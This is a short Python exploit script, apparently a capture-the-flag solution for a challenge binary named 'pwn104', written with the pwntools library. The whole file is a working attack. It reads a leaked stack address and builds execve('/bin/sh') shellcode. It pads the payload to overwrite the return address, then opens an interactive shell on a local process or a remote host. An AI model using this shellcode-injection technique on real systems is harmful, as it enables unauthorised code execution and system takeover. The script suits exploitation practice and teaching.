from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl
import sys

context.binary = exe = ELF("./pwn104.pwn104", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "warning"

class Exploit:
    def __init__(self, p: process):
        self.p = p
    
    def debug(self, script):
        attach(self.p, script)
        
    def get_address(self):
        p = self.p
        p.recvuntil(b"I'm waiting for you at")
        return eval(p.recvline().strip())
        
    def send(self, content):
        p = self.p
        p.sendline(content)

if args.RMT:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process()

x = Exploit(p)

exec_sh = asm(f"""
              {"nop;"*10}
              mov rax, {btl(b"/bin/sh"[::-1])}
              push rax
              mov rax, 59
              mov rdi, rsp
              xor rsi, rsi
              xor rdx, rdx
              syscall
              {"nop;"*10}
              """)
payload = exec_sh
payload += b"A"*(88-len(exec_sh))
payload += pack("<Q", x.get_address())

# x.debug("break *main+129\nc")
x.send(payload)
p.interactive()